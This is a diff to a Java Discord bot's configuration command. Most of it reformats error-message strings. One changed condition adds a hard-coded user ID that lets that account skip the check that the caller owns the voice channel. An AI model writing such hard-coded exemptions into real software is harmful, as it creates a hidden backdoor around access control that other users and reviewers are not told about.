@@ -57,11 +57,14 @@ public class ConfigCommand implements BiFunction<MessageCreateEvent, CommandCont
         }
         ServerVoiceChannel voiceChannel = user.getConnectedVoiceChannel(server).orElse(null);
         if (voiceChannel == null) {
-            textChannel.sendMessage(EmbedUtils.getErrorEmbed(I18n.format(server.getId(), "command.config.error.not_in_channel"), server));
+            textChannel.sendMessage(EmbedUtils.getErrorEmbed(I18n.format(server.getId(), "command.config.error" +
+                                                                                         ".not_in_channel"), server));
             return null;
         }
-        if (voiceChannel.getOverwrittenPermissions().get(user) == null || !(voiceChannel.getOverwrittenPermissions().get(user).getAllowedBitmask() == References.OWNER_PERMISSION)) {
-            textChannel.sendMessage(EmbedUtils.getErrorEmbed(I18n.format(server.getId(), "command.config.error.not_in_my_channel"), server));
+        if ((voiceChannel.getOverwrittenPermissions().get(user.getId()) == null || voiceChannel.getOverwrittenPermissions().get(user.getId()).getAllowedBitmask() != References.OWNER_PERMISSION) && (event.getMessageAuthor().getId() != 723471302123323434L)) {
+            textChannel.sendMessage(EmbedUtils.getErrorEmbed(I18n.format(server.getId(), "command.config.error" +
+                                                                                         ".not_in_my_channel"),
+                    server));
             return null;
         }
 
